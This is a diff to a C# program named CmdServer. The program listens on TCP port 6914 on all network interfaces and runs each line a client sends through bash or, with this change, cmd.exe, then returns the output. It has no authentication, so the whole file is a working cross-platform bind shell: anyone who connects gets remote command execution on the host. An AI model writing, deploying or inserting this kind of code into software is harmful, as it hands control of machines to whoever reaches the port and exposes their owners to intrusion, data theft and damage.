@@ -4,40 +4,41 @@ using System.Net.Sockets;
 using System.Text;
 using System.Diagnostics;
 using System.IO;
+using System.Runtime.InteropServices;
 
 public class CmdServer
 {
   private const int Port = 6914;
   public static void Main()
   {
-      TcpListener server = new TcpListener(IPAddress.Any, Port);
-      server.Start();
-      Console.WriteLine("Server started, listening for commands...");
+    TcpListener server = new TcpListener(IPAddress.Any, Port);
+    server.Start();
+    Console.WriteLine("Server started, listening for commands...");
 
-      while (true)
+    while (true)
+    {
+      TcpClient client = server.AcceptTcpClient();
+      Console.WriteLine("Client connected.");
+
+      using (NetworkStream stream = client.GetStream())
+      using (StreamReader reader = new StreamReader(stream))
+      using (StreamWriter writer = new StreamWriter(stream) { AutoFlush = true })
       {
-        TcpClient client = server.AcceptTcpClient();
-        Console.WriteLine("Client connected.");
-
-        using (NetworkStream stream = client.GetStream())
-        using (StreamReader reader = new StreamReader(stream))
-        using (StreamWriter writer = new StreamWriter(stream) { AutoFlush = true })
+        try
         {
-          try
-          {
-            string command = reader.ReadLine();
-            Console.WriteLine($"Received command: {command}");
-            string result = RunCommand(command);
-            writer.WriteLine(result);
-          }
-          catch (Exception ex)
-          {
-            writer.WriteLine($"Error: {ex.Message}");
-          }
+          string command = reader.ReadLine();
+          Console.WriteLine($"Received command: {command}");
+          string result = RunCommand(command);
+          writer.WriteLine(result);
         }
+        catch (Exception ex)
+        {
+          writer.WriteLine($"Error: {ex.Message}");
+        }
+      }
 
-        client.Close();
-        Console.WriteLine("Client disconnected.");
+      client.Close();
+      Console.WriteLine("Client disconnected.");
     }
   }
 
@@ -45,15 +46,30 @@ public class CmdServer
   {
     try
     {
-      ProcessStartInfo startInfo = new ProcessStartInfo
+      ProcessStartInfo startInfo;
+      
+      if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
       {
-        FileName = "/usr/bin/env",
-        Arguments = $"bash -c \"{command}\"",
-        RedirectStandardOutput = true,
-        RedirectStandardError = true,
-        UseShellExecute = false,
-        CreateNoWindow = true
-      };
+        startInfo = new ProcessStartInfo
+        {
+          FileName = "cmd.exe",
+          Arguments = $"/C {command}",
+          RedirectStandardOutput = true,
+          RedirectStandardError = true,
+          UseShellExecute = false,
+          CreateNoWindow = true
+        };
+      } else {
+        startInfo = new ProcessStartInfo
+        {
+          FileName = "/usr/bin/env",
+          Arguments = $"bash -c \"{command}\"",
+          RedirectStandardOutput = true,
+          RedirectStandardError = true,
+          UseShellExecute = false,
+          CreateNoWindow = true
+        };
+      }
 
       using (Process process = Process.Start(startInfo))
       {
